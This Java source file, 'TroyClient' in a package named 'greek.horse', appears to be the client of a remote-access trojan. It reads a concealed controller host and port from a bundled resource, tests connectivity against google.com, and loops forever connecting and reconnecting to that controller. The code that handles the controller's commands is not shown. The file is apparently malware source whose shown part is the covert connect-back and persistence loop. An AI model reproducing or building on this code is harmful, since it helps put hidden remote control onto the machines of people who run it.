package greek.horse.client;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.apache.log4j.Logger;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class TroyClient {

    private OkHttpClient httpClient;
    private String hostLink;
    private String port;
    private static final Logger log = Logger.getLogger(TroyClient.class);

    public static void main(String[] args) throws IOException {
        new TroyClient().start();
    }

    public TroyClient() {
        try (InputStream in = TroyClient.class.getResourceAsStream("/connection.data")){
            try(Scanner scanner = new Scanner(in)){
                this.hostLink = scanner.next();
                this.port = scanner.next();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void start() {
        new Thread(() -> {
            while (true) {
                System.gc();
                try {
                    Thread.sleep(15 * 1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
        while (true) {
            try {
                ClientSocketManager client = new ClientSocketManager(this);

                if (checkInternet()) {
                    try {
                        client.getRunning().set(true);
                        client.run(this.hostLink, this.port);

                    } catch (Exception e) {
                        log.error("Client closed, reset started",e);
//                        if (e.getMessage() != null && e.getMessage().contains("Connection timed out: connect")) {
//                            System.err.println("Cycling connect");
//                        } else {
//                            e.printStackTrace();
//                        }
                        client.kill();
                        sleep(5);
                    }

                } else {
                    sleep(15);
                    continue;
                }

                while (client.getRunning().get()) {
                    sleep(5);
                }

                System.gc();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }

    private void sleep(int seconds) {
        try {
            Thread.sleep(seconds * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    public boolean checkInternet() {
        httpClient = new OkHttpClient.Builder()
                .callTimeout(5, TimeUnit.SECONDS)
                .connectTimeout(5, TimeUnit.SECONDS)
                .build();
        Request request = new Request.Builder().url("http://www.google.com").build();

        boolean success = false;
        try {
            httpClient.newCall(request).execute().close();
            success = true;
        } catch (IOException ignored) {
        }
        return success;
    }

    public OkHttpClient getHttpClient() {
        return httpClient;
    }
}
